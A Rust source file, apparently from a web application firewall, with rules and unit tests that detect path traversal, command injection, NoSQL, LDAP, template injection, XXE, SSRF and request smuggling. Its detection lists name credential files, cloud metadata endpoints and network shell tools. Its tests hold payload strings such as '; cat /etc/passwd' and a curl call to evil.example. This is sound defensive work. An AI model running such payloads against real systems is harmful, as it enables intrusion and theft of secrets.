//! Additional attack detection:Path Traversal, Command Injection, Protocol Anomalies,
//! NoSQL Injection, SSRF, HTTP Request Smuggling

use crate::{AttackCategory, MatchLocation, RuleMatch};

/// Detect path traversal attacks
pub fn analyze_path_traversal(input: &str, location: MatchLocation) -> Vec<RuleMatch> {
    let mut results = Vec::new();
    let decoded = input.replace('\\', "/");

    let traversal_patterns = [
        "../",
        "..\\",
        "%2e%2e/",
        "%2e%2e\\",
        "..%2f",
        "..%5c",
        "%252e%252e%252f",
        ".... //",
        "..../\\",
    ];
    for p in &traversal_patterns {
        if decoded.to_lowercase().contains(p) {
            results.push(RuleMatch {
                rule_id: 930100,
                category: AttackCategory::PathTraversal,
                score: 5,
                message: format!("Path traversal detected: {}", p),
                location: location.clone(),
                matched_data: truncate(input, 80),
            });
            break;
        }
    }

    // Sensitive file access
    let sensitive = [
        "/etc/passwd",
        "/etc/shadow",
        "/etc/hosts",
        "/proc/self",
        "/proc/version",
        "/var/log/auth.log",
        "/dev/null",
        "web.config",
        ".htaccess",
        ".htpasswd",
        ".env",
        ".git/config",
        ".git/head",
        "/.aws/credentials",
        "/.ssh/id_rsa",
        "wp-config.php",
        "/windows/system32",
    ];
    let lower = decoded.to_lowercase();
    for s in &sensitive {
        if lower.contains(s) {
            results.push(RuleMatch {
                rule_id: 930200,
                category: AttackCategory::PathTraversal,
                score: 5,
                message: format!("Sensitive file access attempt: {}", s),
                location: location.clone(),
                matched_data: truncate(input, 80),
            });
            break;
        }
    }

    results
}

/// Detect command injection attacks
/// Two-tier detection:/// - Rule 932050 (score 3):shell metacharacter alone (may indicate injection attempt)
/// - Rule 932100 (score 5):metacharacter + known dangerous command (confirmed injection)
pub fn analyze_command_injection(input: &str, location: MatchLocation) -> Vec<RuleMatch> {
    let mut results = Vec::new();
    let lower = input.to_lowercase();
    let normalized_shell = lower
        .replace(['\'', '"'], "")
        // Backslash obfuscation: shells treat `\c` as `c`, so `c\at` runs
        // `cat`. Stripping backslashes before matching closes the
        // `;c\at /etc/passwd` bypass (they carry no meaning as separators
        // in shell command position at this layer).
        .replace('\\', "")
        .replace("${ifs}", " ")
        .replace("$ifs", " ")
        .replace("<>", " ")
        .replace(['{', '}'], " ")
        .replace(',', " ");

    // Shell metacharacters used for chaining (space-separated forms)
    let space_meta_patterns = ["; ", "| ", "|| ", "&& ", "& ", "$(", "`", "\n", "\r\n"];

    // Dangerous commands — expanded to include env/xargs/awk/lua/sed/tee
    let dangerous_cmds = [
        "cat ",
        "wget ",
        "curl ",
        "chmod ",
        "chown ",
        "/bin/sh",
        "/bin/bash",
        "/bin/zsh",
        "nc ",
        "ncat ",
        "netcat ",
        "python ",
        "perl ",
        "ruby ",
        "php ",
        "node ",
        "powershell",
        "cmd.exe",
        "whoami",
        "id ",
        "uname ",
        "passwd",
        "shadow",
        "ifconfig",
        "ip addr",
        "rm -rf",
        "dd if=",
        "mkfifo",
        "nohup",
        "eval ",
        "exec ",
        // Expanded:commonly used in injection chains
        "env ",
        "xargs ",
        "awk ",
        "lua ",
        "sed ",
        "tee ",
        "sort ",
        "head ",
        "tail ",
        "cut ",
        "base64",
        "openssl",
        "socat ",
        "busybox",
    ];
    let cmd_names: Vec<&str> = dangerous_cmds.iter().map(|c| c.trim()).collect();

    // Rule 932100 (blocking) requires ADJACENCY: a dangerous command must
    // start within a small window after a real chaining metacharacter
    // (`;` `|` `&` backtick `$(`). Mere co-presence of a metacharacter
    // anywhere in the input plus an English word like "sort"/"head"
    // anywhere else is prose, not injection — and newline is deliberately
    // NOT an adjacency metachar because prose bodies are full of newlines.
    let adjacent_cmd = cmd_in_window_after_metachar(&normalized_shell, &cmd_names);

    if let Some(cmd) = adjacent_cmd {
        results.push(RuleMatch {
            rule_id: 932100,
            category: AttackCategory::CommandInjection,
            score: 5,
            message: format!(
                "Command injection detected: '{}' chained after shell metacharacter",
                cmd.trim()
            ),
            location: location.clone(),
            matched_data: truncate(input, 80),
        });
    } else if space_meta_patterns
        .iter()
        .any(|p| normalized_shell.contains(p))
    {
        // Metacharacter-only rule:fire even if no known command follows it.
        // This catches injection attempts using unlisted/custom binaries
        // without letting prose words escalate the score to blocking.
        results.push(RuleMatch {
            rule_id: 932050,
            category: AttackCategory::CommandInjection,
            score: 3,
            message: "Command injection: shell metacharacter detected without known command"
                .to_string(),
            location: location.clone(),
            matched_data: truncate(input, 80),
        });
    }

    // Backtick command substitution
    if input.contains('`') && input.matches('`').count() >= 2 {
        results.push(RuleMatch {
            rule_id: 932200,
            category: AttackCategory::CommandInjection,
            score: 4,
            message: "Command injection: backtick command substitution detected".to_string(),
            location: location.clone(),
            matched_data: truncate(input, 80),
        });
    }

    results
}

/// Maximum bytes between the end of a chaining metacharacter and the start
/// of a dangerous command for the pair to count as an injection chain.
/// Real chains are `; cat`, `&& curl`, `` `wget` `` — the command is the
/// FIRST word after the metacharacter (modulo separators/whitespace), so
/// the window only needs room for repeats like `||` or `;;;`. Keeping the
/// window this tight is what prevents prose following a semicolon
/// ("yes; please head home") from escalating to a blocking score.
const META_CMD_WINDOW: usize = 16;

/// Chaining metacharacters after which an adjacent dangerous command
/// confirms injection. Newline is intentionally excluded: it is a command
/// separator in shells, but ordinary prose bodies are full of newlines, so
/// treating it as a chain anchor is the classic prose false-positive.
const CHAIN_METACHARS: [&str; 5] = [";", "|", "&", "`", "$("];

/// Find a dangerous command that starts immediately after a chaining
/// metacharacter (skipping further metacharacters/whitespace within
/// [`META_CMD_WINDOW`] bytes), matched as a complete word so `cat` does
/// not match `category`. Returns the matched command.
fn cmd_in_window_after_metachar<'a>(input: &str, cmd_names: &[&'a str]) -> Option<&'a str> {
    for (idx, _) in input.char_indices() {
        for meta in CHAIN_METACHARS {
            if !input[idx..].starts_with(meta) {
                continue;
            }
            let after = &input[idx + meta.len()..];
            // Skip the separator run (`||`, `;;;`, spaces/tabs) — bounded by
            // the window — then require the command word to start there.
            let rest = after.trim_start_matches(['|', '&', ';', ' ', '\t']);
            if after.len() - rest.len() > META_CMD_WINDOW {
                continue;
            }
            if let Some(cmd) = cmd_names
                .iter()
                .copied()
                .find(|cmd| starts_with_complete_word(rest, cmd))
            {
                return Some(cmd);
            }
        }
    }
    None
}

/// `s` starts with `word` as a complete token: the next character after
/// the word (if any) is not alphanumeric/underscore, so `cat` matches
/// `cat x` but not `category`.
fn starts_with_complete_word(s: &str, word: &str) -> bool {
    if !s.starts_with(word) {
        return false;
    }
    // All command names are ASCII, so this slice cannot split a character.
    match s[word.len()..].chars().next() {
        None => true,
        Some(c) => !(c.is_alphanumeric() || c == '_'),
    }
}

/// Detect HTTP protocol violations / request anomalies
pub fn analyze_protocol_anomalies(
    method: &str,
    path: &str,
    headers: &[(String, String)],
    body_size: usize,
    location: MatchLocation,
) -> Vec<RuleMatch> {
    let mut results = Vec::new();

    // Invalid HTTP method — TRACE intentionally excluded from valid_methods
    // so that it triggers BOTH the invalid-method rule (911100, score 3) AND
    // the specific TRACE/XST rule (911200, score 5) for higher composite score.
    let valid_methods = [
        "GET", "POST", "PUT", "DELETE", "PATCH", "HEAD", "OPTIONS", "CONNECT",
    ];
    if !valid_methods.contains(&method.to_uppercase().as_str()) {
        results.push(RuleMatch {
            rule_id: 911100,
            category: AttackCategory::ProtocolViolation,
            score: 3,
            message: format!("Invalid HTTP method: {}", method),
            location: location.clone(),
            matched_data: method.to_string(),
        });
    }

    // TRACE method (used for XST attacks)
    if method.eq_ignore_ascii_case("TRACE") {
        results.push(RuleMatch {
            rule_id: 911200,
            category: AttackCategory::ProtocolViolation,
            score: 5,
            message: "TRACE method detected (Cross-Site Tracing risk)".to_string(),
            location: location.clone(),
            matched_data: method.to_string(),
        });
    }

    // Missing Host header
    let has_host = headers.iter().any(|(k, _)| k.eq_ignore_ascii_case("host"));
    if !has_host {
        results.push(RuleMatch {
            rule_id: 920200,
            category: AttackCategory::ProtocolViolation,
            score: 1,
            message: "Missing Host header".to_string(),
            location: location.clone(),
            matched_data: "<none>".to_string(),
        });
    }

    // Missing Content-Type for body-bearing methods
    if body_size > 0 && (method.eq_ignore_ascii_case("POST") || method.eq_ignore_ascii_case("PUT"))
    {
        let has_ct = headers
            .iter()
            .any(|(k, _)| k.eq_ignore_ascii_case("content-type"));
        if !has_ct {
            results.push(RuleMatch {
                rule_id: 920300,
                category: AttackCategory::ProtocolViolation,
                score: 1,
                message: "Missing Content-Type for body-bearing request".to_string(),
                location: location.clone(),
                matched_data: "<none>".to_string(),
            });
        }
    }

    // Null byte in URL
    if path.contains('\0') || path.contains("%00") {
        results.push(RuleMatch {
            rule_id: 920400,
            category: AttackCategory::RequestAnomaly,
            score: 5,
            message: "Null byte in URL path".to_string(),
            location: location.clone(),
            matched_data: truncate(path, 80),
        });
    }

    results
}

/// A MongoDB operator counts as an injection signal only when it appears
/// in the position of a JSON/BSON KEY — `"$in"`, `{$or:`, `[$ne]`,
/// `: $gt` — rather than as a substring of an ordinary value: `$invoice_id`
/// contains `$in` and `$order_id` contains `$or`, and flagging those as
/// NoSQL injection broke every JSON body that mentioned them.
fn has_operator_as_key(input: &str, op: &str) -> bool {
    let mut from = 0;
    while from < input.len() {
        let rel = match input[from..].find(op) {
            Some(rel) => rel,
            None => return false,
        };
        let start = from + rel;
        let end = start + op.len();
        // The operator must be a complete token, i.e. not a prefix of a
        // longer identifier: `$in` must not match inside `$invoice_id`.
        let complete_token = match input[end..].chars().next() {
            None => true,
            Some(c) => !(c.is_alphanumeric() || c == '_'),
        };
        // The character before the operator must place it in key position:
        // directly after `{`, `[` or a quote, or (Mongo-shell style) after
        // `,`/`:` with optional whitespace.
        let before = input[..start].chars().next_back();
        let key_position = match before {
            Some('{') | Some('[') | Some('"') | Some('\'') => true,
            Some(' ') | Some('\t') => {
                let prev = &input[..start - 1];
                matches!(
                    prev.chars().next_back(),
                    Some(',') | Some(':') | Some('{') | Some('[')
                )
            }
            _ => false,
        };
        if complete_token && key_position {
            return true;
        }
        // `$` is ASCII, so `start + 1` is always a char boundary here.
        from = start + 1;
    }
    false
}

/// Detect NoSQL injection attacks (MongoDB, Redis, Elasticsearch)
pub fn analyze_nosql_injection(input: &str, location: MatchLocation) -> Vec<RuleMatch> {
    let mut results = Vec::new();
    let lower = input.to_lowercase();

    // MongoDB operator injection patterns
    let mongo_operators = [
        "$where",
        "$gt",
        "$gte",
        "$lt",
        "$lte",
        "$ne",
        "$in",
        "$nin",
        "$regex",
        "$exists",
        "$type",
        "$or",
        "$and",
        "$not",
        "$nor",
        "$elemMatch",
        "$size",
        "$all",
        "$mod",
        "$eq",
    ];

    let has_mongo = mongo_operators
        .iter()
        .any(|op| has_operator_as_key(&lower, op));
    if has_mongo {
        // Check if it looks like injection (operator in a query-like context)
        let suspicious_context = lower.contains('{')
            || lower.contains('[')
            || lower.contains("true")
            || lower.contains("false");
        if suspicious_context {
            results.push(RuleMatch {
                rule_id: 944100,
                category: AttackCategory::NoSqlInjection,
                score: 5,
                message: "MongoDB NoSQL injection: operator in structured context".to_string(),
                location: location.clone(),
                matched_data: truncate(input, 80),
            });
        }
    }

    // MongoDB $where with JavaScript code execution
    if lower.contains("$where")
        && (lower.contains("function") || lower.contains("this.") || lower.contains("sleep("))
    {
        results.push(RuleMatch {
            rule_id: 944110,
            category: AttackCategory::NoSqlInjection,
            score: 8,
            message: "MongoDB $where JavaScript injection".to_string(),
            location: location.clone(),
            matched_data: truncate(input, 80),
        });
    }

    // Redis command injection patterns
    let redis_commands = [
        "eval ",
        "evalsha ",
        "script ",
        "config set",
        "config get",
        "flushall",
        "flushdb",
        "keys *",
        "debug sleep",
        "slaveof ",
        "replicaof ",
        "module load",
    ];
    for cmd in &redis_commands {
        if lower.contains(cmd) {
            results.push(RuleMatch {
                rule_id: 944200,
                category: AttackCategory::NoSqlInjection,
                score: 5,
                message: format!("Redis command injection: {}", cmd.trim()),
                location: location.clone(),
                matched_data: truncate(input, 80),
            });
            break;
        }
    }

    // Elasticsearch query DSL injection patterns
    let es_patterns = [
        "\"script\"",
        "\"_source\"",
        "\"query\":{",
        "\"bool\":{",
        "\"match_all\"",
        "\"wildcard\"",
        "\"fuzzy\"",
        "painless",
        "groovy",
        "_search",
        "_mapping",
    ];
    let es_count = es_patterns
        .iter()
        .filter(|p| lower.contains(&p.to_lowercase()))
        .count();
    if es_count >= 2 {
        results.push(RuleMatch {
            rule_id: 944300,
            category: AttackCategory::NoSqlInjection,
            score: 5,
            message: "Elasticsearch query DSL injection attempt".to_string(),
            location: location.clone(),
            matched_data: truncate(input, 80),
        });
    }

    results
}

/// Detect SSRF (Server-Side Request Forgery) patterns
pub fn analyze_ssrf(input: &str, location: MatchLocation) -> Vec<RuleMatch> {
    let mut results = Vec::new();
    let lower = input.to_lowercase();

    // Dangerous URL schemes
    let dangerous_schemes = [
        "file://",
        "dict://",
        "gopher://",
        "ldap://",
        "ldaps://",
        "tftp://",
        "ftp://",
        "jar://",
    ];
    for scheme in &dangerous_schemes {
        if lower.contains(scheme) {
            results.push(RuleMatch {
                rule_id: 934100,
                category: AttackCategory::Ssrf,
                score: 5,
                message: format!("SSRF: dangerous URL scheme detected: {}", scheme),
                location: location.clone(),
                matched_data: truncate(input, 80),
            });
            break;
        }
    }

    // Internal/private IP ranges in URLs
    let internal_patterns = [
        "://127.",
        "://localhost",
        "://0.0.0.0",
        "://0000:",
        "://10.",
        "://172.16.",
        "://172.17.",
        "://172.18.",
        "://172.19.",
        "://172.20.",
        "://172.21.",
        "://172.22.",
        "://172.23.",
        "://172.24.",
        "://172.25.",
        "://172.26.",
        "://172.27.",
        "://172.28.",
        "://172.29.",
        "://172.30.",
        "://172.31.",
        "://192.168.",
        "://169.254.",
        "://[::1]",
        "://[fe80:",
        "://[fc00:",
        "://[fd",
        "://0x7f",
        "://2130706433",
        "://0177.",
        "://0:",
        "://[0:0:0:0:0:ffff:127.",
    ];
    for pat in &internal_patterns {
        if lower.contains(pat) {
            results.push(RuleMatch {
                rule_id: 934200,
                category: AttackCategory::Ssrf,
                score: 5,
                message: "SSRF: URL targeting internal/private IP range".to_string(),
                location: location.clone(),
                matched_data: truncate(input, 80),
            });
            break;
        }
    }

    // Cloud metadata endpoints
    let metadata_patterns = [
        "169.254.169.254",          // AWS/GCP/Azure metadata
        "metadata.google.internal", // GCP metadata
        "metadata.azure.com",       // Azure IMDS
        "100.100.100.200",          // Alibaba Cloud metadata
    ];
    for pat in &metadata_patterns {
        if lower.contains(pat) {
            results.push(RuleMatch {
                rule_id: 934300,
                category: AttackCategory::Ssrf,
                score: 8,
                message: format!("SSRF: cloud metadata endpoint access: {}", pat),
                location: location.clone(),
                matched_data: truncate(input, 80),
            });
            break;
        }
    }

    results
}

/// Detect LDAP injection payloads in query/body fragments.
pub fn analyze_ldap_injection(input: &str, location: MatchLocation) -> Vec<RuleMatch> {
    let lower = input.to_lowercase();
    let suspicious = lower.contains(")(|")
        || lower.contains("(&)")
        || lower.contains("(|")
        || lower.contains("=*)")
        || lower.ends_with("=*")
        || lower.contains("objectclass=*")
        || lower.contains("uid=*")
        || lower.contains("password=*");

    if !suspicious {
        return Vec::new();
    }

    vec![RuleMatch {
        rule_id: 933500,
        category: AttackCategory::NoSqlInjection,
        score: 5,
        message: "LDAP injection pattern detected".to_string(),
        location,
        matched_data: truncate(input, 80),
    }]
}

/// Detect server-side template injection payloads.
///
/// Two tiers:
/// - score 5 (blocking): a template delimiter together with — or a payload
///   consisting solely of — a real exploitation sink. The sinks alone
///   (`__class__`, `system(`, ...) have no legitimate meaning in request
///   input, so they keep blocking severity without a delimiter.
/// - score 2 (informational): a bare template delimiter. `{{ user.name }}`
///   and `${order.total}` appear in every legitimately templated body, so
///   the delimiter alone only nudges the anomaly score.
pub fn analyze_ssti(input: &str, location: MatchLocation) -> Vec<RuleMatch> {
    let lower = input.to_lowercase();
    let has_delimiter = lower.contains("{{")
        || lower.contains("${")
        || lower.contains("#{")
        || lower.contains("<%=");

    // Exploitation sinks (lowercase). `eval` is matched as `eval(` to keep
    // English words like "medieval" or "evaluation" from acting as sinks.
    // `.constructor` covers `constructor.constructor`.
    let sinks = [
        "__class__",
        "__subclasses__",
        "__globals__",
        ".constructor",
        "system(",
        "subprocess",
        "eval(",
        "getruntime().exec",
        "popen(",
    ];
    let has_sink = sinks.iter().any(|s| lower.contains(s));

    if !has_delimiter && !has_sink {
        return Vec::new();
    }

    let probe_interior = has_probe_template_interior(&lower);

    let (score, message) = if has_sink || probe_interior {
        (
            5,
            "Server-side template injection: exploitation sink or probe expression detected",
        )
    } else {
        (
            2,
            "Template syntax without exploitation sink (informational)",
        )
    };

    vec![RuleMatch {
        rule_id: 935100,
        category: AttackCategory::Rce,
        score,
        message: message.to_string(),
        location,
        matched_data: truncate(input, 80),
    }]
}

/// Template interiors that indicate a probing payload rather than a
/// legitimate template variable:
/// - compact arithmetic (`7*7`, `7*'7'`) — the classic detection probe.
///   Spaced math (`{{ subtotal + tax }}`) is ordinary templating and does
///   not match; the probe must have digit-operator-operand with no spaces.
/// - references to the host objects an attacker wants (`config`, `self`,
///   `settings`, `lipsum`, `cycler`) — Flask/Jinja exploitation staples.
fn has_probe_template_interior(lower: &str) -> bool {
    let mut interiors: Vec<&str> = Vec::new();
    for (open, close) in [("{{", "}}"), ("<%=", "%>"), ("${", "}"), ("#{", "}")] {
        let mut from = 0;
        while let Some(rel) = lower[from..].find(open) {
            let start = from + rel + open.len();
            if let Some(end_rel) = lower[start..].find(close) {
                interiors.push(&lower[start..start + end_rel]);
                from = start + end_rel + close.len();
            } else {
                break;
            }
        }
    }

    for interior in interiors {
        let bytes = interior.as_bytes();
        for i in 0..bytes.len().saturating_sub(2) {
            if bytes[i].is_ascii_digit()
                && matches!(bytes[i + 1], b'*' | b'+' | b'-' | b'/')
                && (bytes[i + 2].is_ascii_digit() || bytes[i + 2] == b'\'')
            {
                return true;
            }
        }
        let mut has_probe_word = false;
        for word in interior.split(|c: char| !(c.is_ascii_alphanumeric() || c == '_')) {
            if matches!(
                word,
                "config" | "self" | "settings" | "lipsum" | "cycler" | "joiner" | "namespace"
            ) {
                has_probe_word = true;
                break;
            }
        }
        if has_probe_word {
            return true;
        }
    }
    false
}

/// Detect XML external entity payloads.
pub fn analyze_xxe(input: &str, location: MatchLocation) -> Vec<RuleMatch> {
    let lower = input.to_lowercase();
    let suspicious = (lower.contains("<!doctype") && lower.contains("<!entity"))
        || lower.contains("system \"file://")
        || lower.contains("system 'file://")
        || lower.contains("system \"http")
        || lower.contains("system 'http")
        || lower.contains("php://filter")
        || lower.contains("%xxe;");

    if !suspicious {
        return Vec::new();
    }

    vec![RuleMatch {
        rule_id: 935200,
        category: AttackCategory::RequestAnomaly,
        score: 5,
        message: "XML external entity pattern detected".to_string(),
        location,
        matched_data: truncate(input, 80),
    }]
}

/// Detect HTTP request smuggling patterns
pub fn analyze_request_smuggling(
    headers: &[(String, String)],
    _body: Option<&str>,
    location: MatchLocation,
) -> Vec<RuleMatch> {
    let mut results = Vec::new();

    let has_te = headers
        .iter()
        .any(|(k, _)| k.eq_ignore_ascii_case("transfer-encoding"));
    let has_cl = headers
        .iter()
        .any(|(k, _)| k.eq_ignore_ascii_case("content-length"));

    // CL+TE or TE+CL smuggling:both headers present simultaneously
    if has_te && has_cl {
        results.push(RuleMatch {
            rule_id: 921100,
            category: AttackCategory::RequestSmuggling,
            score: 5,
            message:
                "HTTP Request Smuggling: both Content-Length and Transfer-Encoding headers present"
                    .to_string(),
            location: location.clone(),
            matched_data: "<none>".to_string(),
        });
    }

    // Multiple Transfer-Encoding headers or obfuscated Transfer-Encoding
    let te_headers: Vec<&str> = headers
        .iter()
        .filter(|(k, _)| k.eq_ignore_ascii_case("transfer-encoding"))
        .map(|(_, v)| v.as_str())
        .collect();

    if te_headers.len() > 1 {
        results.push(RuleMatch {
            rule_id: 921110,
            category: AttackCategory::RequestSmuggling,
            score: 5,
            message: "HTTP Request Smuggling: duplicate Transfer-Encoding headers".to_string(),
            location: location.clone(),
            matched_data: "<none>".to_string(),
        });
    }

    // Obfuscated Transfer-Encoding values (e.g., "chunked ", " chunked", "Chunked")
    for val in &te_headers {
        let trimmed = val.trim();
        if trimmed != "chunked" && trimmed.to_lowercase().contains("chunked") {
            results.push(RuleMatch {
                rule_id: 921120,
                category: AttackCategory::RequestSmuggling,
                score: 5,
                message: format!(
                    "HTTP Request Smuggling: obfuscated Transfer-Encoding: {:?}",
                    val
                ),
                location: location.clone(),
                matched_data: val.to_string(),
            });
        }
    }

    // CR/LF injection in header values (header injection)
    for (name, value) in headers {
        if value.contains('\r') || value.contains('\n') {
            results.push(RuleMatch {
                rule_id: 921200,
                category: AttackCategory::RequestSmuggling,
                score: 5,
                message: format!("HTTP Header Injection: CRLF in header value: {}", name),
                location: location.clone(),
                matched_data: truncate(value, 80),
            });
        }
    }

    // Multiple Content-Length headers with differing values
    let cl_values: Vec<&str> = headers
        .iter()
        .filter(|(k, _)| k.eq_ignore_ascii_case("content-length"))
        .map(|(_, v)| v.as_str())
        .collect();
    if cl_values.len() > 1 {
        let unique: std::collections::HashSet<&str> = cl_values.iter().copied().collect();
        if unique.len() > 1 {
            results.push(RuleMatch {
                rule_id: 921130,
                category: AttackCategory::RequestSmuggling,
                score: 8,
                message: "HTTP Request Smuggling: conflicting Content-Length headers".to_string(),
                location: location.clone(),
                matched_data: format!("{:?}", cl_values),
            });
        }
    }

    results
}

/// Re-analyze an already-decoded path for traversal patterns.
/// Call this after `decoder::decode_payload` has run to catch multi-layer encoding.
pub fn analyze_path_traversal_post_decode(
    decoded_input: &str,
    location: MatchLocation,
) -> Vec<RuleMatch> {
    // Re-run the full traversal check on the decoder output.
    // This catches triple-encoded sequences (e.g. %25252e) that survive a single
    // decode pass but resolve to `../` after the decoder strips one layer.
    analyze_path_traversal(decoded_input, location)
}

/// Safely truncate a string at character boundary (not byte offset).
/// Prevents panic on multi-byte UTF-8 sequences.
fn truncate(s: &str, max_chars: usize) -> String {
    match s.char_indices().nth(max_chars) {
        Some((byte_idx, _)) => format!("{}...", &s[..byte_idx]),
        None => s.to_string(),
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::MatchLocation;

    #[test]
    fn test_path_traversal() {
        let r = analyze_path_traversal("../../etc/passwd", MatchLocation::Path);
        assert!(!r.is_empty());
    }

    #[test]
    fn test_command_injection() {
        let r = analyze_command_injection("; cat /etc/passwd", MatchLocation::Body);
        assert!(r.iter().any(|m| m.rule_id == 932100));
    }

    #[test]
    fn test_command_injection_backslash_obfuscation() {
        // `c\at` is `cat` to the shell; backslashes are stripped before
        // command matching.
        let r = analyze_command_injection(";c\\at /etc/passwd", MatchLocation::Body);
        assert!(
            r.iter().any(|m| m.rule_id == 932100),
            "`;c\\at /etc/passwd` must fire 932100"
        );
        let r2 = analyze_command_injection("|w\\hoami", MatchLocation::Body);
        assert!(
            r2.iter().any(|m| m.rule_id == 932100),
            "`|w\\hoami` must fire 932100"
        );
    }

    #[test]
    fn test_command_injection_metachar_only() {
        // Metacharacter with an unlisted binary should still fire rule 932050
        let r = analyze_command_injection("; /opt/custom_binary --exfiltrate", MatchLocation::Body);
        assert!(
            r.iter().any(|m| m.rule_id == 932050),
            "Should detect metacharacter-only injection"
        );
    }

    #[test]
    fn test_command_injection_expanded_cmds() {
        let r = analyze_command_injection("; env VAR=x", MatchLocation::Body);
        assert!(
            r.iter().any(|m| m.rule_id == 932100),
            "Should detect env command injection"
        );
        let r2 = analyze_command_injection("| xargs rm", MatchLocation::Body);
        assert!(
            r2.iter().any(|m| m.rule_id == 932100),
            "Should detect xargs command injection"
        );
    }

    #[test]
    fn test_clean_path() {
        let r = analyze_path_traversal("/api/v1/users/123", MatchLocation::Path);
        assert!(r.is_empty());
    }

    #[test]
    fn test_command_injection_prose_not_scored_5() {
        // Fail-first: natural-language bodies with a newline plus a bare
        // word like "sort" must NOT reach blocking score (932100).
        let r = analyze_command_injection(
            "please sort by date\nthanks for the update",
            MatchLocation::Body,
        );
        assert!(
            !r.iter().any(|m| m.rule_id == 932100),
            "prose with newline + distant 'sort' must not fire 932100, got {:?}",
            r.iter().map(|m| m.rule_id).collect::<Vec<_>>()
        );
    }

    #[test]
    fn test_command_injection_adjacent_cmd_still_detected() {
        // Real chaining (metachar directly followed by the command) is
        // still a confirmed injection.
        for payload in [
            "; cat /etc/passwd",
            "x; sort /etc/passwd",
            "ok && curl http://evil.example/x",
            "value; nohup /bin/sh",
            "run; base64 -d payload",
        ] {
            let r = analyze_command_injection(payload, MatchLocation::Body);
            assert!(
                r.iter().any(|m| m.rule_id == 932100),
                "{payload:?} must fire 932100"
            );
        }
    }

    #[test]
    fn test_command_injection_distant_cmd_after_metachar_not_5() {
        // Dangerous word more than 8 chars after the metachar is prose
        // co-presence, not chaining.
        let r = analyze_command_injection(
            "hello; and then later we will sort and head home",
            MatchLocation::Body,
        );
        assert!(
            !r.iter().any(|m| m.rule_id == 932100),
            "distant word co-presence must not fire 932100"
        );
    }

    #[test]
    fn test_ssti_legit_template_not_blocked() {
        // Fail-first: a legitimate template variable like "{{ user.name }}"
        // must not reach blocking severity (score 5); at most a low flag.
        let r = analyze_ssti("Hello {{ user.name }}, welcome back!", MatchLocation::Body);
        let ssti = r.iter().find(|m| m.rule_id == 935100);
        assert!(
            ssti.map(|m| m.score) <= Some(2),
            "standalone template syntax must score <= 2, got {:?}",
            ssti.map(|m| m.score)
        );
    }

    #[test]
    fn test_ssti_template_with_sink_blocked() {
        // Template delimiter + exploitation sink = confirmed SSTI → 5.
        for payload in [
            "{{7*7}} output test {{ x.__class__ }}",
            "{{7*7}}.__class__.__mro__[1]",
            "${x.__class__}",
            "<%= system('id') %>",
            "{{ constructor.constructor('return 1')() }}",
        ] {
            let r = analyze_ssti(payload, MatchLocation::Body);
            let ssti = r.iter().find(|m| m.rule_id == 935100);
            assert!(
                ssti.map(|m| m.score) == Some(5),
                "{payload:?} (template + sink) must score 5"
            );
        }
    }

    #[test]
    fn test_nosql_operator_must_be_json_key() {
        // Fail-first: "$in" as a substring of "$invoice_id" must not match.
        let r = analyze_nosql_injection(
            "{\"invoice\": \"$invoice_id is pending\"}",
            MatchLocation::Body,
        );
        assert!(
            !r.iter().any(|m| m.rule_id == 944100),
            "'$invoice_id' substring must not fire 944100, got {:?}",
            r.iter().map(|m| m.rule_id).collect::<Vec<_>>()
        );
        // "$order_id" contains "$or" — also must not match.
        let r2 = analyze_nosql_injection("{\"order\": \"$order_id\"}", MatchLocation::Body);
        assert!(
            !r2.iter().any(|m| m.rule_id == 944100),
            "'$order_id' substring must not fire 944100"
        );
    }

    #[test]
    fn test_nosql_real_mongo_operators_still_detected() {
        for payload in [
            "{\"user\": {\"$in\": [\"admin\", \"root\"]}}",
            "{\"age\": {\"$gt\": 18}}",
            "db.users.find({$or: [{name: \"a\"}, {name: \"b\"}]})",
            "username[$ne]=1",
        ] {
            let r = analyze_nosql_injection(payload, MatchLocation::Body);
            assert!(
                r.iter().any(|m| m.rule_id == 944100),
                "{payload:?} must fire 944100"
            );
        }
    }

    #[test]
    fn test_trace_method_dual_rule() {
        let r = analyze_protocol_anomalies(
            "TRACE",
            "/",
            &[("Host".into(), "example.com".into())],
            0,
            MatchLocation::Path,
        );
        // TRACE should trigger BOTH 911100 (invalid method) and 911200 (XST)
        assert!(
            r.iter().any(|m| m.rule_id == 911100),
            "TRACE should trigger invalid method rule"
        );
        assert!(
            r.iter().any(|m| m.rule_id == 911200),
            "TRACE should trigger XST rule"
        );
    }
}
